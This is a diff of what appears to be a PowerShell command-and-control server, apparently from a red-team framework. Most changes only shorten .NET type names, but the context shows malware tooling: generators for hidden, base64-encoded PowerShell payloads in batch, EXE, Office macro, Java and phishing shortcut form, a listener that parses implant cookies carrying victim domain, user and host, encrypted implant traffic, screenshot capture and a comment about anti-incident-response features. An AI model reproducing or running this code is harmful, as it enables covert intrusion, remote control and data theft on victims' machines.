@@ -69,21 +69,21 @@ function Create-AesManagedObject
     )
 
     $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [Security.Cryptography.PaddingMode]::Zeros
     $aesManaged.BlockSize = 128
     $aesManaged.KeySize = 256
     if ($IV) 
     {
         if ($IV.getType().Name -eq 'String') 
-        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
+        {$aesManaged.IV = [Convert]::FromBase64String($IV)}
         else 
         {$aesManaged.IV = $IV}
     }
     if ($key) 
     {
         if ($key.getType().Name -eq 'String') 
-        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
+        {$aesManaged.Key = [Convert]::FromBase64String($key)}
         else 
         {$aesManaged.Key = $key}
     }
@@ -95,7 +95,7 @@ function Create-AesKey()
 {
     $aesManaged = Create-AesManagedObject
     $aesManaged.GenerateKey()
-    [System.Convert]::ToBase64String($aesManaged.Key)
+    [Convert]::ToBase64String($aesManaged.Key)
 }
 
 # encryption utility using Rijndael encryption, an AES equivelant, returns encrypted bytes block 
@@ -109,7 +109,7 @@ function Encrypt-String2
         $unencryptedString
     )
 
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $bytes = [Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
@@ -132,7 +132,7 @@ function Decrypt-String2
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor()
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    [Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
 # encryption utility using Rijndael encryption, an AES equivelant, returns encrypted base64 block 
@@ -146,12 +146,12 @@ function Encrypt-String
         $unencryptedString
     )
 
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $bytes = [Text.Encoding]::UTF8.GetBytes($unencryptedString)
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    [System.Convert]::ToBase64String($fullData)
+    [Convert]::ToBase64String($fullData)
 }
 
 # decryption utility using Rijndael encryption, an AES equivelant, returns unencrypted UTF8 data
@@ -164,12 +164,12 @@ function Decrypt-String
         [Object]
         $encryptedStringWithIV
     )
-    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $bytes = [Convert]::FromBase64String($encryptedStringWithIV)
     $IV = $bytes[0..15]
     $aesManaged = Create-AesManagedObject $key $IV
     $decryptor = $aesManaged.CreateDecryptor()
     $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
-    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+    [Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
 # download file function to convert from base64 in db to file
@@ -183,7 +183,7 @@ function Download-File
     $SourceFilePath = Resolve-PathSafe $SourceFilePath
     $bufferSize = 90000
     $buffer = New-Object byte[] $bufferSize
-    $reader = [System.IO.File]::OpenRead($SourceFilePath)
+    $reader = [IO.File]::OpenRead($SourceFilePath)
     $base64 = $null
      
     $bytesRead = 0
@@ -210,8 +210,8 @@ function ConvertFrom-Base64
     $TargetFilePath = Resolve-PathSafe $TargetFilePath
     $bufferSize = 90000
     $buffer = New-Object char[] $bufferSize
-    $reader = [System.IO.File]::OpenText($SourceFilePath)
-    $writer = [System.IO.File]::OpenWrite($TargetFilePath)
+    $reader = [IO.File]::OpenText($SourceFilePath)
+    $writer = [IO.File]::OpenWrite($TargetFilePath)
      
     $bytesRead = 0
     do
@@ -239,7 +239,7 @@ function Resolve-PathSafe
 # create bat payloads
 function CreatePayload 
 {
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     [IO.File]::WriteAllLines("$global:newdir\payload.bat", $payload)
@@ -247,7 +247,7 @@ function CreatePayload
     Write-Host -Object "Batch Payload written to: $global:newdir\payload.bat"  -ForegroundColor Green
 }
 function CreateStandAloneExe {
-$bytescom = [System.Text.Encoding]::Unicode.GetBytes($command)
+$bytescom = [Text.Encoding]::Unicode.GetBytes($command)
 $praw = [Convert]::ToBase64String($bytescom)
 $csccode = 'using System;
 using System.Text;
@@ -348,7 +348,7 @@ if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
 # create macro payloads
 function CreateMacroPayload 
 {
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = [Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     $payloadbits = $null
@@ -420,7 +420,7 @@ function CreateMacroPayload
 function CreateJavaPayload
 {
 $OutputPath="$pwd"
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$bytes = [Text.Encoding]::Unicode.GetBytes($command)
 $payloadraw = [Convert]::ToBase64String($bytes)
 
 # Java code taken from the Social Enginnering Toolkit (SET) by David Kennedy
@@ -687,7 +687,7 @@ primer | iex }'
     CreateStandAloneExe
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
 
@@ -727,7 +727,7 @@ primer | iex }'
 # add as many images to the images directory as long as the images are less than 1500 bytes in size
 $imageArray = @()
 $imageFilesUsed = @()
-$imageFiles = Get-ChildItem "C:\Temp\PowershellC2\Images" | select FullName
+$imageFiles = Get-ChildItem "C:\Temp\PowershellC2\Images" | Select-Object -ExpandProperty FullName
 $count = 0 
 
 while ($count -lt 5) {
@@ -808,7 +808,7 @@ while ($listener.IsListening)
         # create new key for each implant comms
         $key = Create-AesKey
         $endpointip = $request.RemoteEndPoint
-        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
+        $cookieplaintext = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(($request.Cookies[0]).Value))
         $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)
 
         ## add anti-ir and implant safety mechanisms here!
@@ -1005,7 +1005,7 @@ while($true)
     }
 }'
 
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
+$Bytes = [Text.Encoding]::Unicode.GetBytes($message)
 $message =[Convert]::ToBase64String($Bytes)
 
     }
@@ -1118,7 +1118,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 $imageBytes = [Convert]::FromBase64String($backToPlainText)
                 $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
                 $ms.Write($imageBytes, 0, $imageBytes.Length)
-                $image = [System.Drawing.Image]::FromStream($ms, $true)
+                $image = [Drawing.Image]::FromStream($ms, $true)
                 $image.Save("$imagepath")
                 $backToPlainText = "Captured Screenshot: $global:newdir\$randomimageid.png 123456<>654321"
                 }
@@ -1179,7 +1179,7 @@ $message =[Convert]::ToBase64String($Bytes)
     </body></html>
     '}
     
-    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+    [byte[]] $buffer = [Text.Encoding]::UTF8.GetBytes($message)
     $response.ContentLength64 = $buffer.length
     $response.StatusCode = 200
     $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
